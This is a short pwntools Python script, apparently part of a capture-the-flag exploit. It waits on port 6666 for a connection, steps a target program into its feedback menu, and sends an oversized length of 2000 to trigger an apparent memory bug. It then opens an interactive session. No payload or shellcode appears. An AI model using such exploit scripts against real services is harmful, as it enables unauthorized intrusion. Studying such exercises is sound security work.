from pwn import *

log.info("Wait for incoming connection...")

l = listen(6666)
_ = l.wait_for_connection()

log.info("Go into feedback menu...")
l.recvuntil("> ")
l.sendline("3")

log.info("Waiting for second server to go into feedback...")
time.sleep(2)
l.sendlineafter("length: ", "2000")

log.info("Feedback length sent...")
pause()
l.interactive()